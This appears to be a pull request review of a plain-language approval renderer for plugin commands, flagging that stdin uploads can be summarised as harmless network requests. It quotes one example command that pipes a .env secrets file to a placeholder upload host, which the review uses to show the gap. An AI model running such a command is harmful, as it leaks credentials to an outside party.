## Summary

Keep open. The feature is not on current main, and the latest PR head still has a concrete approval-safety gap: stdin-backed uploads through input redirection can be summarized as an ordinary network request while `simple` mode hides the raw command.

## What This Changes

The PR adds an opt-in `approvals.plugin.language` setting, plain-language plugin approval rendering, Telegram/Matrix/fallback wiring, config/docs updates, and renderer regressions.

## Best Possible Solution

Keep the opt-in renderer shape, but make stdin uploads and ambiguous input redirection fail closed or show a redacted command preview before `simple` mode can suppress raw technical text.

## Reproduction Assessment

Yes for the review finding by source inspection: `curl --data-binary @- https://example.test/upload < .env` drops the `@-` operand, never records the input-redirected file, and falls through to a medium network summary with no preview. The broader item is a feature PR, not a current-main bug report.

## Solution Assessment

No, not yet. The config and channel wiring are plausible, but the renderer needs a conservative stdin/input-redirection path before the raw command can be hidden safely.
